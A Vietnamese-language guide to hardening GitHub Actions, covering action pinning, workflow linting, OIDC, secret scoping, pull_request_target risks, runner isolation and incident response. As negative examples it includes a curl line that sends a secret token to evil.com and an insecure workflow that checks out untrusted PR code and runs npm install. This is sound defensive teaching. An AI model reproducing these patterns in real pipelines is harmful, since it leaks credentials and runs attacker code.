# Security Hardening cho GitHub Actions

Các biện pháp bảo mật nâng cao dựa trên supply chain attacks thực tế năm 2026.

## Supply Chain Attack Prevention

### Cooldown period cho actions mới

Đợi 7-14 ngày trước khi adopt action versions mới. 80-90% supply chain attacks được phát hiện trong vòng 1 tuần.

Dùng tools:
- `pinact --min-age 7` - Pin actions với minimum age
- Renovate với `minimumReleaseAge` config

### Workflow linting

Thêm static analysis vào CI:

```yaml
- name: Lint workflows
  uses: docker://ghcr.io/woodruffw/zizmor:latest
  with:
    args: .
```

zizmor phát hiện:
- Unpinned actions
- Template injection vulnerabilities  
- Dangerous triggers (pull_request_target)
- Excessive permissions

### Action allowlisting

Restrict actions có thể chạy (available all GitHub plans 2026+):

**Organization level:**
Settings → Actions → General → "Allow select actions and reusable workflows"

Chỉ cho phép:
- Actions từ GitHub (`actions/*`)
- Actions từ org của bạn
- Specific verified actions

### Dependencies section (2026+)

GitHub đang giới thiệu `dependencies:` section để lock tất cả transitive dependencies:

```yaml
dependencies:
  actions/checkout:
    sha: b4ffde65f46336ab88eb53be808477a3936bae11
    version: v4.1.1
  actions/setup-node:
    sha: 1a4442cacd436585916779262731d5b162bc6ec7
    version: v4.0.2
```

Tương tự `go.mod + go.sum` - đảm bảo reproducibility hoàn toàn.

## Credential Protection

### Ngăn secret exfiltration

**Không bao giờ:**
```yaml
- run: echo ${{ secrets.API_KEY }}  # Sẽ bị mask nhưng vẫn nguy hiểm
- run: curl https://evil.com?token=${{ secrets.API_KEY }}
```

**Nên:**
```yaml
- name: Use secret safely
  env:
    API_KEY: ${{ secrets.API_KEY }}
  run: |
    # Secret chỉ available trong step này
    ./script.sh
```

### OIDC thay vì long-lived tokens

Dùng OpenID Connect cho cloud providers:

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/GitHubActions
      aws-region: us-east-1
```

OIDC tokens với custom properties (GA 2026):

```yaml
# Repository custom property: environment=production
# OIDC token sẽ include claim: "environment": "production"
```

Cloud provider có thể enforce policies dựa trên claims này.

### Minimize secrets scope

Chỉ grant secrets cho jobs cần:

```yaml
jobs:
  test:
    # Không cần secrets
    runs-on: ubuntu-latest
    
  deploy:
    # Chỉ job này access secrets
    environment: production
    runs-on: ubuntu-latest
```

## Poisoned Pipeline Execution (PPE) Prevention

### Nguy hiểm với pull_request_target

`pull_request_target` chạy trong context của base branch với full repo access - nguy hiểm nếu execute untrusted code:

```yaml
# NGUY HIỂM
on: pull_request_target

jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Untrusted code!
      - run: npm install  # Có thể run malicious postinstall scripts
```

**Safe pattern:**
```yaml
on: pull_request_target

jobs:
  test:
    steps:
      # Không checkout PR code
      - uses: actions/checkout@v4  # Checkout base branch
      
      # Chỉ download artifacts từ separate untrusted workflow
      - uses: actions/download-artifact@v4
```

### Audit high-privilege triggers

Review cẩn thận workflows với:
- `pull_request_target`
- `workflow_run`  
- `issue_comment`

Những triggers này có access cao hơn và có thể bị exploit.

## Network Egress Controls (2026 Roadmap)

GitHub đang roll out egress filtering:

**Monitor mode**: Track tất cả network connections từ workflows  
**Enforce mode**: Block traffic không nằm trong allowlist

Pattern:
1. Enable monitoring
2. Xây dựng allowlist dựa trên real traffic
3. Test với enforce mode
4. Activate enforcement

## Runner Security

### Self-hosted runners

Nếu dùng self-hosted runners:

❌ **Không bao giờ** dùng cho public repos  
✅ Isolate runners (containers, VMs)  
✅ Rotate runners thường xuyên  
✅ Không cache credentials trên runners  
✅ Monitor runner activity  

### GitHub-hosted runners

An toàn hơn vì ephemeral (clean state mỗi run) nhưng:
- Vẫn cần pin actions
- Vẫn cần least privilege permissions
- Vẫn có thể bị network-based attacks

## Audit và Monitoring

### Workflow audit log

Review thường xuyên:
- Changes to workflows (đặc biệt từ external contributors)
- New secrets added
- Permission changes
- Action usage patterns

### Automated security scanning

Integrate tools:
- **zizmor**: Static analysis cho workflows
- **trajan/Gato-X**: Enumeration và attack testing  
- **allstar**: Policy enforcement (OpenSSF)

```yaml
- name: Security scan
  run: |
    docker run --rm -v "$PWD:/repo" ghcr.io/woodruffw/zizmor:latest /repo
```

## Incident Response

Nếu phát hiện compromise:

1. **Revoke secrets immediately**
2. Review workflow run logs cho exfiltration
3. Check for unauthorized changes
4. Rotate tất cả credentials có thể bị exposed
5. Pin tất cả actions to known-good SHAs
6. Audit transitive dependencies

## Resources

- [GitHub Actions Security Guide](https://docs.github.com/en/actions/security-guides)
- [Wiz GitHub Actions Security Guide](https://www.wiz.io/blog/github-actions-security-guide) - Lessons from 2026 attacks
- [SITF Framework](https://github.com/slsa-framework/sitf) - SDLC threat taxonomy
